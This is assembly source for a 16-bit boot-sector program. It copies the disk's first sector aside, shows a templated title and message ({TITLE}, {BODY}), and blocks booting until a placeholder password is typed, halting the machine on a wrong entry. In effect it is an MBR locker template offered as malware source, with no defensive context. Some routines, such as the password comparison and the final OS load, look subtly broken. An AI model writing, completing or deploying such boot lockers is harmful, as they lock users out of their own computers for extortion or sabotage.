BITS 16
ORG 0x7C00

start:
    cli
    cld
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti

    call save_mbr

    mov ax, 0x0003
    int 0x10

    mov ah, 0x06
    mov al, 0
    mov bh, 0x00
    mov cx, 0
    mov dx, 0x184F
    int 0x10

    mov ax, 0x0A00
    int 0x10

    mov si, msg_title
    call print

    mov si, msg_body
    call print

    mov si, msg_prompt
    call print

    call get_password
    call check_password
    cmp byte [password_ok], 1
    je restore_and_boot

    mov si, msg_wrong
    call print
    jmp hang

restore_and_boot:
    call restore_mbr
    jmp load_os

save_mbr:
    pusha
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7E00
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 1
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc .error

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7E00
    mov ah, 0x03
    mov al, 1
    mov ch, 0
    mov cl, 2
    mov dh, 0
    mov dl, 0x80
    int 0x13
.error:
    popa
    ret

restore_mbr:
    pusha
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7E00
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 2
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc .error

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7E00
    mov ah, 0x03
    mov al, 1
    mov ch, 0
    mov cl, 1
    mov dh, 0
    mov dl, 0x80
    int 0x13
.error:
    popa
    ret

load_os:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 1
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jmp 0x0000:0x7C00

print:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print
.done:
    ret

get_password:
    mov di, buffer
.loop:
    xor ax, ax
    int 0x16
    cmp al, 0x0D
    je .done
    cmp al, 0x08
    je .backspace
    stosb
    mov ah, 0x0E
    mov al, '*'
    int 0x10
    jmp .loop
.backspace:
    cmp di, buffer
    je .loop
    dec di
    mov ah, 0x0E
    mov al, 0x08
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 0x08
    int 0x10
    jmp .loop
.done:
    mov byte [di], 0
    ret

check_password:
    mov si, buffer
    mov di, password
.compare:
    lodsb
    or al, al
    jz .check_end
    cmpsb
    jne .fail
    jmp .compare
.check_end:
    cmp byte [di], 0
    jne .fail
    mov byte [password_ok], 1
.fail:
    ret

hang:
    cli
    hlt
    jmp hang

msg_title:
    db 0x0D, 0x0A
    db '========================================', 0x0D, 0x0A
    db '     {TITLE} ', 0x0D, 0x0A
    db '========================================', 0x0D, 0x0A
    db 0

msg_body:
    db 0x0D, 0x0A
    db '{BODY}', 0x0D, 0x0A
    db 0

msg_prompt:
    db 0x0D, 0x0A
    db 'Password: ', 0

msg_wrong:
    db 0x0D, 0x0A
    db 'Wrong password!', 0x0D, 0x0A
    db 0

password:
    db '{PASSWORD}', 0

buffer:
    times 32 db 0

password_ok:
    db 0

times 510 - ($ - $$) db 0
dw 0xAA55
